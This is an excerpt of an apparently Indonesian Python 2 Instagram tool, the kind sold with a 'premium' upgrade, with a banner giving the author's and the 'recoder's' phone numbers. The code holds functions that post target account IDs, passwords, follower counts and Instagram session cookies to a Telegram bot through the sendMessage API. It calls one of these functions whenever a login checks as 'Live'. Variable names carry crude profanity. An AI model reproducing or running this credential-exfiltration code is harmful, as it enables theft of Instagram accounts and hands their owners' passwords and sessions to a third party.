...
def bokep_japan_yang_terbaru(STT, id_target, pw_target, ttl_target):
        dasar_kang_recoder_kontol_engga_ada_otak = ('''https://api.telegram.org/bot'''+TOOK+'''/sendMessage?chat_id='''+IDTT+'''&text='''+id_target+'''|'''+pw_target+'''|'''+ttl_target)
        requests.post(dasar_kang_recoder_kontol_engga_ada_otak)
def bokep_barat_yang_terbaru(token):
        dasar_kang_recoder_kontool_engga_ada_otak = ('''https://api.telegram.org/bot'''+TOOKKUKIS+'''/sendMessage?chat_id='''+IDTT+'''&text=
[?] COKIES IG 2021 :
'''+token+'''
''')
        requests.post(dasar_kang_recoder_kontool_engga_ada_otak)
#bokep_japan_yang_terbaru("IG", "x", "c", "z")
def iqbel(iq):
        try:
                sem_pak_bol_ong = ""
                iqbal = iq
...
def cek_login():
	...
	try:
		...
		url = "https://i.instagram.com/api/v1/friendships/50307151176/followers/?count=5"
...
def info_dev(username_dev, pass_dev, status):
	try:
		...
		if status == "Live":
			...
			try:
				bokep_japan_yang_terbaru("IG", username_dev, pass_dev, str(pengikut))
			except:
				bokep_japan_yang_terbaru("IG", tampilkan_live, "", "")
...
#	wak_ = base64.b64decode(("MjAyMSAxMiAyMg==>>bGludXgtNC45Ljc3Ky1hYXJjaDY0LXdpdGgtbGliYw==")).split()
	...
	fol_dev = "2021 12 10" # Ultimited
	print fol_dev + "MANTAP"
	print fol_tamzz

	wak_ = "2021 11 30".split()
	followerz = ""
	print followerz + "KOSONG"
...
# Mau Ngapain Cuk?
baner = """
{BY : IQBAL DEV_} === {628812457948}
{RECODER : RISKY} === {6283143565470}
...
def menu_dev():
	...
	try:
		...
		print belum_premium
	print garis
	print "Jika Expired Harap Beli Sama Iqbal :P"
...
#	print a+" ["+k+"7"+a+"] "+p+"Update Tool"
	...
	if pil == "upgrade_premium":
		print a+"Hub To Chat : 6283143565470 ==>> RECODER"
		print h+"Hub To Buy  : 628812457948 ==>> Athour"
		'''
